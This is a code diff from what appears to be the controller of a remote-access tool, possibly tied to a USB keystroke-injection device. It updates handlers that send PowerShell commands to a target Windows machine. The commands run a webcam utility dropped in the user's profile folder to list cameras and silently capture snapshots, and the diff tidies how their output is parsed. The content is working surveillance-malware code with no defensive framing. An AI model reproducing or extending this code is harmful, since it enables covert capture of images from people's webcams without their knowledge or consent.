@@ -319,18 +319,19 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:11] == "webcam_list":
             commands = []
-            commands.append("$a = [string] (& \"$env:userprofile/z/webcam.exe\" /devlist 2>&1) -split \'\\n\'")
-            commands.append("$a[10..($a.count - 2)]")
+            commands.append("$a = ([string] (& \"$env:userprofile/z/webcam.exe\" /devlist 2>&1)) -split \'\\n\'")
+            commands.append("($a[10..$a.count] | out-string).trim()")
             commands.append("remove-variable a")
             stdin = "; ".join(commands)
-            conn.recv(1024).decode()
         elif ducky_command[:11] == "webcam_snap":
             options = [x for x in ducky_command.split(" ")[1:] if x]
             commands = []
             if len(options) > 0:
-                commands.append("& \"$env:userprofile/z/webcam.exe\" /filename \"$env:userprofile/z/webcam.bmp\" /devnum " + options[0])
+                commands.append("$a = ([string] (& \"$env:userprofile/z/webcam.exe\" /filename \"$env:userprofile\\z\\webcam.bmp\" /devnum " + options[0] + " 2>&1)) -split \'\\n\'")
             else:
-                commands.append("& \"$env:userprofile/z/webcam.exe\" /filename \"$env:userprofile/z/webcam.bmp\"")
+                commands.append("$a = ([string] (& \"$env:userprofile/z/webcam.exe\" /filename \"$env:userprofile\\z\\webcam.bmp\" 2>&1)) -split \'\\n\'")
+            commands.append("($a[10..$a.count] | out-string).trim()")
+            commands.append("remove-variable a")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
